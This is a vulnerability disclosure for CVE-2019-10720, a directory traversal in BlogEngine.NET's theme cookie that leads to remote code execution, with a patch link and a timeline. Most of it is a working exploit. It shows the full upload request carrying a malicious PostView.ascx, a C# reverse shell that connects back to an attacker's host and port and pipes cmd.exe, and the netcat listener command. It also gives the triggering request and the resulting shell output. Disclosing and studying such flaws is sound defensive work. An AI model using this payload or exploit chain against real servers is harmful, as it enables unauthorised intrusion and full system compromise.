<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns=http://www.w3.org/1999/xhtml><head><meta http-equiv=Content-Type content="text/html; charset=utf-8"><meta http-equiv=Content-Style-Type content=text/css><meta name=generator content=pandoc><title></title><style type=text/css>code{white-space: pre;}</style><link rel=stylesheet href=/home/aaron/.VirtualEnvs/rum/local/lib/python2.7/site-packages/sugar/data/default.css></head><body><p>A remote code execution (RCE) attack, CVE-2019-10720, exists on BlogEngine.NET versions 3.3.7 and earlier. A user with privileges to add/upload files could upload a malicious <code>PostView.ascx</code> file and exploit a directory traversal in the <strong>theme</strong> cookie to trigger the RCE.</p><h2 id=vendor-patch><span class=header-section-number>0.1</span> Vendor Patch</h2><ul><li><a href=https://github.com/rxtur/BlogEngine.NET/releases class=uri>https://github.com/rxtur/BlogEngine.NET/releases</a></li></ul><h2 id=timeline><span class=header-section-number>0.2</span> Timeline</h2><ul><li>Identified: 30 Mar 2019</li><li>Initial Developer Contact: 31 Mar 2019</li><li>Issue Disclosed: 17 Jun 2019</li></ul><h2 id=description><span class=header-section-number>0.3</span> Description</h2><p>The application will use the <strong>theme</strong> cookie if the <strong>theme</strong> parameter is not set:</p><div class="has-header ends-with-r-b codeblock"><div class="command header"> BlogEngine.Core/BlogSettings.cs </div><div class=output><pre class=inline><code>413         public string Theme
414         {
415             get
416             {
417                 var context = HttpContext.Current;
418                 if (context != null)
419                 {
420                     var request = context.Request;
421                     if (request.QueryString[&quot;theme&quot;] != null)
422                     {
423                         return request.QueryString[&quot;theme&quot;];
424                     }
425
</code></pre><pre class="r-b inline"><code>426                     var cookie = request.Cookies[this.ThemeCookieName];
427                     if (cookie != null)
428                     {
429                         return cookie.Value;
430                     }</code></pre></div></div><p>The <strong>theme</strong> cookie is vulnerable to a directory traversal; the <strong>theme</strong> cookie can be set to a folder that contains a malicious <code>PostView.ascx</code>, such as <code>.../../App_Data/files</code>. The malicious code contained in <code>PostView.ascx</code> will be executed.</p><h2 id=exploit><span class=header-section-number>0.4</span> Exploit</h2><p><a href=https://github.com/irbishop/CVEs/blob/master/2019-10720/exploit.py class=uri>https://github.com/irbishop/CVEs/blob/master/2019-10720/exploit.py</a></p><p>A malicious file can be uploaded using <code>File Manager</code> in the application, <code>/api/upload?action=file</code>, or <code>/api/upload?action=filemgr</code>. In the following example <code>/api/upload?action=file</code> is used to upload the malicious <code>PostView.ascx</code> file:</p><p><pagebreak></pagebreak></p><div class="no-header codeblock"><div class=output><pre class=inline><code>POST /api/upload?action=file HTTP/1.1
Host: </code></pre><pre class="r-var inline"><code>$RHOST</code></pre><pre class=inline><code>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/plain
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: .AUXBLOGENGINE-96d5b379-7e1d-4dac-a6ba-1e50db561b04=</code></pre><pre class="r-redacted inline"><code>COOKIE</code></pre><pre class=inline><code>
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------12143974373743678091868871063
Content-Length: 2085

-----------------------------12143974373743678091868871063
Content-Disposition: form-data; filename=&quot;PostView.ascx&quot;

&lt;%@ Control Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; EnableViewState=&quot;false&quot; Inherits=&quot;BlogEngine.Core.Web.Controls.PostViewBase&quot; %&gt;
&lt;%@ Import Namespace=&quot;BlogEngine.Core&quot; %&gt;

&lt;script runat=&quot;server&quot;&gt;
    static System.IO.StreamWriter streamWriter;

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);

        using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(&quot;</code></pre><pre class="r-var inline"><code>$LHOST</code></pre><pre class=inline><code>&quot;, </code></pre><pre class="r-var inline"><code>$LPORT</code></pre><pre class=inline><code>)) {
            using(System.IO.Stream stream = client.GetStream()) {
                using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
                    streamWriter = new System.IO.StreamWriter(stream);

                    StringBuilder strInput = new StringBuilder();

                    System.Diagnostics.Process p = new System.Diagnostics.Process();
                    p.StartInfo.FileName = &quot;cmd.exe&quot;;
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardInput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
                    p.Start();
                    p.BeginOutputReadLine();

                    while(true) {
                        strInput.Append(rdr.ReadLine());
                        p.StandardInput.WriteLine(strInput);
                        strInput.Remove(0, strInput.Length);
                    }
                }
            }
        }
    }

    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
        StringBuilder strOutput = new StringBuilder();

        if (!String.IsNullOrEmpty(outLine.Data)) {
            try {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
            } catch (Exception err) { }
        }
    }
&lt;/script&gt;
&lt;asp:PlaceHolder ID=&quot;phContent&quot; runat=&quot;server&quot; EnableViewState=&quot;false&quot;&gt;&lt;/asp:PlaceHolder&gt;

-----------------------------12143974373743678091868871063--</code></pre></div></div><p>The exploit can be triggered by opening a <code>netcat</code> listener:</p><div class="has-header codeblock"><div class="command header"> nc -nlvp <span class=r-var>$LPORT</span></div><div class=output><pre class=inline><code>listening on [any] </code></pre><pre class="r-var inline"><code>$LPORT</code></pre><pre class=inline><code> ...</code></pre></div></div><p>Browsing to the application with the <strong>theme</strong> cookie set to <code>../../App_Data/files/2019/06/</code>, no authentication required, triggers the Code Execution and opens a reverse shell:</p><div class="no-header codeblock"><div class=output><pre class=inline><code>GET / HTTP/1.1
Host: </code></pre><pre class="r-var inline"><code>$LHOST</code></pre><pre class=inline><code>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: </code></pre><pre class="r-var inline"><code>theme</code></pre><pre class=inline><code>=</code></pre><pre class="r-b inline"><code>../../App_Data/files/2019/06</code></pre><pre class=inline><code>;
Connection: close
Upgrade-Insecure-Requests: 1</code></pre></div></div><div class="has-header codeblock"><div class="command header"> nc -nlvp <span class=r-var>$LPORT</span></div><div class=output><pre class=inline><code>listening on [any] </code></pre><pre class="r-var inline"><code>$LPORT</code></pre><pre class=inline><code> ...
connect to [</code></pre><pre class="r-var inline"><code>$LHOST</code></pre><pre class=inline><code>] from (UNKNOWN) [</code></pre><pre class="r-var inline"><code>$RHOST</code></pre><pre class=inline><code>] 49822
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
ipconfig
C:\Windows\system32&gt;ipconfig
Windows IP Configuration
Ethernet adapter Local Area Connection:</code></pre></div></div></body></html>